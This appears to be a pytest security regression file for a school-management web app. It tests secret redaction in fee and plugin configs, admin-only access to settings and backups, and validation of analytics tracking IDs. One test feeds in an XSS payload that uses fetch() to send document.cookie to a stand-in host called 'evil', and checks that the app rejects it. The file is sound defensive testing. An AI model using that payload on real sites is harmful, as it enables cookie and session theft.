"""Security wave regression tests (2026-09-08).

F1  — gateway secrets (fee_config) never serialize on public/auth reads
F2/F7 — plugin config reads are admin-only + secret envelopes redacted
F4  — tracking-id write validation (GA/pixel allowlists)
F5  — /database-backup is superadmin-only
"""
import pytest

from tests.conftest import get_auth_headers


@pytest.fixture()
def student_login(db, school):
    from app.models.user import User

    u = User(
        school_id=school.id,
        role="student",
        full_name="Sec Test Student",
        email="sec.student@test.edu.np",
        phone="+9779811100077",
        is_active=True,
    )
    u.set_password("SecPass@123")
    db.session.add(u)
    db.session.commit()
    return u


@pytest.fixture()
def school_with_gateway(db, school):
    """School with an eSewa-style gateway secret in fee_config."""
    from app.models.school import School

    school.fee_config = {
        "vat_percent": 13,
        "payment_methods": [
            {
                "key": "esewa",
                "enabled": True,
                "merchant_code": "EPAYTEST",
                "secret_key": "super-secret-hmac-key",
            }
        ],
    }
    db.session.commit()
    return school


class TestFeeConfigLeak:
    def test_current_school_hides_fee_config_from_student(
        self, client, db, school_with_gateway, student_login
    ):
        r = client.get(
            "/api/v1/schools/current",
            headers=get_auth_headers(client, student_login.email, "SecPass@123"),
        )
        assert r.status_code == 200
        data = r.get_json()["data"]
        assert "fee_config" not in data
        assert "super-secret-hmac-key" not in _dumps(data)

    def test_current_school_settings_admin_only(
        self, client, db, school_with_gateway, student_login, admin_user
    ):
        r = client.get(
            "/api/v1/schools/current/settings",
            headers=get_auth_headers(client, student_login.email, "SecPass@123"),
        )
        assert r.status_code == 403

        r = client.get(
            "/api/v1/schools/current/settings",
            headers=get_auth_headers(client, admin_user.email, "Test@1234"),
        )
        assert r.status_code == 200
        assert r.get_json()["data"]["fee_config"]["payment_methods"][0][
            "secret_key"
        ] == "super-secret-hmac-key"  # admins may still read their own config


class TestPluginConfigReads:
    def test_installed_hides_config_from_student(self, client, db, school, student_login, admin_user):
        from app.models.plugin import Plugin, SchoolPlugin

        plugin = Plugin.query.filter_by(slug="attendance").first()
        if not plugin:
            plugin = Plugin(slug="attendance", name="Attendance", category="starter",
                            is_free=True, is_published=True, version="1.0.0")
            db.session.add(plugin)
        db.session.add(SchoolPlugin(
            school_id=school.id, plugin_slug="attendance", active=True,
            is_trial=False, config={"internal_note": "hello"}))
        db.session.commit()

        r = client.get(
            "/api/v1/plugins/installed",
            headers=get_auth_headers(client, student_login.email, "SecPass@123"),
        )
        assert r.status_code == 200
        for entry in r.get_json()["data"]:
            assert "config" not in entry

    def test_installed_redacts_undeclared_secret_envelopes(
        self, client, db, school, admin_user
    ):
        """F2/F24: ai_teacher provisions webhook_secret into config without a
        schema `type: secret` field — the envelope sweep must redact it."""
        from app.models.plugin import Plugin, SchoolPlugin

        plugin = Plugin.query.filter_by(slug="attendance").first()
        if not plugin:
            plugin = Plugin(slug="attendance", name="Attendance", category="starter",
                            is_free=True, is_published=True, version="1.0.0")
            db.session.add(plugin)
        envelope = {"__secret__": True, "ciphertext": "abc", "last4": "xyz9"}
        db.session.add(SchoolPlugin(
            school_id=school.id, plugin_slug="attendance", active=True,
            is_trial=False, config={"webhook_secret": envelope, "plain": "v"}))
        db.session.commit()

        r = client.get(
            "/api/v1/plugins/installed",
            headers=get_auth_headers(client, admin_user.email, "Test@1234"),
        )
        assert r.status_code == 200
        att = next(e for e in r.get_json()["data"] if e["plugin_slug"] == "attendance")
        assert att["config"]["webhook_secret"] == {"__secret__": True, "last4": "xyz9"}
        assert "ciphertext" not in att["config"]["webhook_secret"]
        assert att["config"]["plain"] == "v"


class TestTrackingIdValidation:
    @pytest.fixture()
    def basic_website_installed(self, db, school):
        from app.models.plugin import Plugin, SchoolPlugin

        p = Plugin.query.filter_by(slug="basic_website").first()
        if not p:
            p = Plugin(
                slug="basic_website", name="Basic Website", category="core",
                is_free=True, is_published=True, version="1.0.0",
            )
            db.session.add(p)
        db.session.add(SchoolPlugin(
            school_id=school.id, plugin_slug="basic_website", active=True,
            is_trial=False))
        db.session.commit()

    def test_malicious_ga_id_rejected(self, client, db, school, admin_user, basic_website_installed):
        r = client.put(
            "/api/v1/website/config",
            json={"google_analytics_id": "x';/*steal*/fetch('//evil/?c='+document.cookie);//"},
            headers=get_auth_headers(client, admin_user.email, "Test@1234"),
        )
        assert r.status_code == 400, r.get_json()

    def test_valid_ga_id_accepted(self, client, db, school, admin_user, basic_website_installed):
        r = client.put(
            "/api/v1/website/config",
            json={"google_analytics_id": "G-ABCDE12345"},
            headers=get_auth_headers(client, admin_user.email, "Test@1234"),
        )
        assert r.status_code == 200, r.get_json()


class TestDatabaseBackupGate:
    def test_tenant_admin_denied(self, client, db, school, admin_user):
        r = client.get(
            "/api/v1/database-backup",
            headers=get_auth_headers(client, admin_user.email, "Test@1234"),
        )
        assert r.status_code == 403, r.get_json()


def _dumps(obj) -> str:
    import json

    return json.dumps(obj)
